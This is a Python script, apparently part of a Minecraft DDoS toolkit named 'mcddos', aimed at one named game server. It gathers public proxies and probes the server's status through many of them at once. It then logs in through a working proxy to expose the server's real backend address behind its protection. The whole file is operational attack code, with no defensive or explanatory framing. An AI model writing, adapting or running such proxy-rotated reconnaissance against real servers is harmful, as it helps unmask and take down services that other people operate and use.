import asyncio, sys, json, time
sys.path.insert(0, '.')
from mcddos.proxies import fetch_proxies, verify_one_async
from mcddos.mcconn import MCConn

HOST = "CoreLand.go-srv.top"
PORT = 25565

async def status_via(p, pvn, timeout=8):
    c = MCConn(HOST, PORT, timeout=timeout, proxy=p)
    c.log = lambda *a: None
    try:
        d = await c.status(pvn=pvn)
        return d
    except Exception as e:
        return None
    finally:
        await c.close()

async def main():
    print("fetching proxies...", flush=True)
    proxies = await fetch_proxies(limit=400)
    print(f"got {len(proxies)} proxies", flush=True)

    # test status through a sample of proxies concurrently
    sample = proxies[:120]
    sem = asyncio.Semaphore(30)

    async def worker(p):
        async with sem:
            for pvn in (775, 767):
                d = await status_via(p, pvn)
                if isinstance(d, dict):
                    v = d.get("version", {})
                    print(f"SUCCESS via {p['host']}:{p['port']} ({p['type']}): "
                          f"pvn={pvn} ver={v.get('name')} proto={v.get('protocol')} "
                          f"players={d.get('players',{}).get('online')}", flush=True)
                    return (p, d)
            return None

    t0 = time.time()
    results = []
    for coro in asyncio.as_completed([worker(p) for p in sample]):
        r = await coro
        if r:
            results.append(r)
        if time.time() - t0 > 60 or len(results) >= 3:
            break
    print(f"\n{len(results)} proxy(es) returned status in {time.time()-t0:.0f}s", flush=True)

    # full login through first working proxy to catch prelogin real IP
    if results:
        p, _ = results[0]
        print(f"\n=== full login via {p['host']}:{p['port']} ===", flush=True)
        for pvn in (775, 767):
            c = MCConn(HOST, PORT, timeout=20, proxy=p, username="mcddosdetect")
            c.log = lambda *a: None
            try:
                ok = await c.login(pvn, wait_play=True)
            except Exception as e:
                ok = f"ERR {type(e).__name__}: {e}"
            print(f"  login pvn={pvn}: ok={ok} kick={c.kick_reason} real_backend={c.real_backend}", flush=True)
            await c.close()

asyncio.run(main())
